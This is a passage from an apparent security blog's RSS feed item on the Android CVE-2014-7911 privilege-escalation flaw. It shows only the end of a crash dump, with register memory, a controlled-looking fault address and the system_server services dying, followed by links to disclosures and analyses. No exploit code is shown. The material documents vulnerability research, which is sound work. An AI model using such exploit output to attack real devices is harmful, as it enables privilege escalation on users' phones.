I/DEBUG   (  130):     1337bedc ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130):     1337beec ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130):     1337befc ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130):     1337bf0c ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130): 
I/DEBUG   (  130): memory near r9:
I/DEBUG   (  130):     1337becc ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130):     1337bedc ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130):     1337beec ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130):     1337befc ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130):     1337bf0c ffffffff ffffffff ffffffff ffffffff  ................
I/DEBUG   (  130): 
I/DEBUG   (  130): memory near sl:
I/DEBUG   (  130):     50e2a8f8 00740073 0061006d 00000073 00000453  s.t.m.a.s...S...
I/DEBUG   (  130):     50e2a908 58b38b40 57090f64 5713b130 5927e000  @..Xd..W0..W..&#39;Y
I/DEBUG   (  130):     50e2a918 40decef8 000021aa 5cf2ada8 00000000  ...@.!.....\....
I/DEBUG   (  130):     50e2a928 5cf2addc 00000006 00000000 407540c0  ...\.........@u@
I/DEBUG   (  130):     50e2a938 00000000 00000000 56545670 5708d300  ........pVTV...W
I/DEBUG   (  130): 
I/DEBUG   (  130): memory near fp:
I/DEBUG   (  130):     5cf2ac74 5cf2ac80 57090f68 40753f34 57090f64  ...\h..W4?u@d..W
I/DEBUG   (  130):     5cf2ac84 00000001 42a4e838 00000000 00000000  ....8..B........
I/DEBUG   (  130):     5cf2ac94 40783187 57090f64 58e4e177 401d5ca9  .1x@d..Ww..X.\.@
I/DEBUG   (  130):     5cf2aca4 50e2a918 00000000 00000000 5b8fafc8  ...P...........[
I/DEBUG   (  130):     5cf2acb4 4014fa70 00000001 50e2a908 ffffbfff  p..@.......P....
I/DEBUG   (  130): 
I/DEBUG   (  130): memory near ip:
I/DEBUG   (  130):     40222d5c 40450a35 40450a91 40155370 402deca0  5.E@..E@pS.@..-@
I/DEBUG   (  130):     40222d6c 404509d1 404508a5 400ac8d9 4042bdf5  ..E@..E@...@..B@
I/DEBUG   (  130):     40222d7c 400d8e41 40450869 40450795 404507f9  A..@i.E@..E@..E@
I/DEBUG   (  130):     40222d8c 4045175d 40451a4d 40450715 4011625c  ].E@M.E@..E@\b.@
I/DEBUG   (  130):     40222d9c 40139135 400d8d8f 4024578d 4024d549  5..@...@.W$@I.$@
I/DEBUG   (  130): 
I/DEBUG   (  130): memory near sp:
I/DEBUG   (  130):     5cf2ac30 40cca768 4077efa9 f2100001 407811dd  h..@..w@......x@
I/DEBUG   (  130):     5cf2ac40 40cca768 50e2a908 df0027ad 00000000  h..@...P.&#39;......
I/DEBUG   (  130):     5cf2ac50 402248ec 40cca768 f2100001 401d5cf3  .H&amp;quot;@h..@.....\.@
I/DEBUG   (  130):     5cf2ac60 5831a278 5713b048 50e2a908 00000000  x.1XH..W...P....
I/DEBUG   (  130):     5cf2ac70 57090f70 5cf2ac80 57090f68 40753f34  p..W...\h..W4?u@
I/DEBUG   (  130): 
I/DEBUG   (  130): code around pc:
I/DEBUG   (  130):     400d8e24 680168a0 4629694a 68e34790 d50407da  .h.hJi)F.G.h....
I/DEBUG   (  130):     400d8e34 b11068a0 68536802 bd384798 4605b570  .h...hSh.G8.p..F
I/DEBUG   (  130):     400d8e44 460e6844 f7fd4620 2801eb3e 68a0d10b  Dh.F F..&amp;gt;..(...h
I/DEBUG   (  130):     400d8e54 68ca6801 47904631 07d868e3 6828d403  .h.h1F.G.h....(h
I/DEBUG   (  130):     400d8e64 46286843 46204798 e8bd4631 f7ff4070  Ch(F.G F1F..p@..
I/DEBUG   (  130): 
I/DEBUG   (  130): code around lr:
I/DEBUG   (  130):     401d5cd0 468168e2 47b84628 69626829 46282300  .h.F(F.G)hbi.#(F
I/DEBUG   (  130):     401d5ce0 71b4f8d1 47b84631 4648490a f7d34479  ...q1F.G.IHFyD..
I/DEBUG   (  130):     401d5cf0 f8d8ee92 46313000 0c0cf853 f7d34440  .....01FS...@D..
I/DEBUG   (  130):     401d5d00 f7d5ee8a e8bdea10 f02443f8 bf00bed7  .........C$.....
I/DEBUG   (  130):     401d5d10 0004ec36 00000409 4605b538 447b4b0f  6.......8..F.K{D
I/DEBUG   (  130): 
I/DEBUG   (  130): memory map around fault addr 1337bef3:
I/DEBUG   (  130):     (no map below)
I/DEBUG   (  130):     (no map for address)
I/DEBUG   (  130):     40000000-40002000 /system/lib/libsystem_server.so
E/dalvikvm(  553): GC_FOR_ALLOC freed 1895K, 17% free 20590K/24711K, paused 3ms+4ms, total 33ms
E/dalvikvm(  343): GC_CONCURRENT freed 1909K, 72% free 960K/3395K, paused 11ms+19ms, total 41ms
I/ServiceManager(  125): service &#39;network_management&#39; died
W/AudioFlinger(32595): power manager service died !!!
I/ServiceManager(  125): service &#39;backup&#39; died
I/ServiceManager(  125): service &#39;permission&#39; died
I/ServiceManager(  125): service &#39;hardware&#39; died
I/ServiceManager(  125): service &#39;netstats&#39; died
I/ServiceManager(  125): service &#39;sensorservice&#39; died
I/ServiceManager(  125): service &#39;content&#39; died
I/ServiceManager(  125): service &#39;mount&#39; died
I/ServiceManager(  125): service &#39;account&#39; died
I/ServiceManager(  125): service &#39;alarm&#39; died
I/ServiceManager(  125): service &#39;scheduling_policy&#39; died
I/ServiceManager(  125): service &#39;cpuinfo&#39; died
I/ServiceManager(  125): service &#39;power&#39; died
I/ServiceManager(  125): service &#39;clipboard&#39; died
I/ServiceManager(  125): service &#39;textservices&#39; died
I/ServiceManager(  125): service &#39;commontime_management&#39; died
I/ServiceManager(  125): service &#39;input_method&#39; died
I/ServiceManager(  125): service &#39;device_policy&#39; died
I/ServiceManager(  125): service &#39;accessibility&#39; died
I/ServiceManager(  125): service &#39;statusbar&#39; died
I/ServiceManager(  125): service &#39;window&#39; died
I/ServiceManager(  125): service &#39;input&#39; died
I/ServiceManager(  125): service &#39;battery&#39; died
I/ServiceManager(  125): service &#39;RfTestService&#39; died
I/ServiceManager(  125): service &#39;bluetooth_gattclient&#39; died
I/ServiceManager(  125): service &#39;vibrator&#39; died
I/ServiceManager(  125): service &#39;batteryinfo&#39; died
I/ServiceManager(  125): service &#39;bluetooth_a2dp&#39; died
I/ServiceManager(  125): service &#39;bluetooth&#39; died
I/ServiceManager(  125): service &#39;bluetooth_gattserver&#39; died
I/ServiceManager(  125): service &#39;lock_settings&#39; died
I/ServiceManager(  125): service &#39;usagestats&#39; died
I/ServiceManager(  125): service &#39;netpolicy&#39; died
I/ServiceManager(  125): service &#39;wifip2p&#39; died
I/ServiceManager(  125): service &#39;wifi&#39; died
I/ServiceManager(  125): service &#39;connectivity&#39; died
W/Sensors (  553): sensorservice died [0x5b6ab978]
I/ServiceManager(  125): service &#39;servicediscovery&#39; died
I/ServiceManager(  125): service &#39;throttle&#39; died
I/ServiceManager(  125): service &#39;updatelock&#39; died
I/ServiceManager(  125): service &#39;entropy&#39; died
I/ServiceManager(  125): service &#39;notification&#39; died
I/ServiceManager(  125): service &#39;hdmi&#39; died
I/ServiceManager(  125): service &#39;devicestoragemonitor&#39; died
I/ServiceManager(  125): service &#39;location&#39; died
I/ServiceManager(  125): service &#39;country_detector&#39; died
I/ServiceManager(  125): service &#39;search&#39; died
I/ServiceManager(  125): service &#39;dropbox&#39; died
I/ServiceManager(  125): service &#39;wallpaper&#39; died
I/ServiceManager(  125): service &#39;diskstats&#39; died
I/ServiceManager(  125): service &#39;audio&#39; died
I/ServiceManager(  125): service &#39;samplingprofiler&#39; died
I/ServiceManager(  125): service &#39;usb&#39; died
I/ServiceManager(  125): service &#39;serial&#39; died
I/ServiceManager(  125): service &#39;appwidget&#39; died
I/ServiceManager(  125): service &#39;uimode&#39; died
I/ServiceManager(  125): service &#39;ku.pService.dr&#39; died
I/ServiceManager(  125): service &#39;package&#39; died
I/ServiceManager(  125): service &#39;activity&#39; died
I/ServiceManager(  125): service &#39;meminfo&#39; died
I/ServiceManager(  125): service &#39;gfxinfo&#39; died
I/ServiceManager(  125): service &#39;dbinfo&#39; died
I/ServiceManager(  125): service &#39;telephony.registry&#39; died
D/AndroidRuntime( 2684): Shutting down VM
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;references&#34;&gt;References&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://seclists.org/fulldisclosure/2014/Nov/51&#34;&gt;http://seclists.org/fulldisclosure/2014/Nov/51&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.droidsec.cn/cve-2014-7911%E5%AE%89%E5%8D%93%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&#34;&gt;http://www.droidsec.cn/cve-2014-7911%E5%AE%89%E5%8D%93%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.droidsec.cn/%E5%86%8D%E8%AE%BAcve-2014-7911%E5%AE%89%E5%8D%93%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&#34;&gt;http://www.droidsec.cn/%E5%86%8D%E8%AE%BAcve-2014-7911%E5%AE%89%E5%8D%93%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://drops.wooyun.org/mobile/6082&#34;&gt;http://drops.wooyun.org/mobile/6082&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
  </channel>
</rss>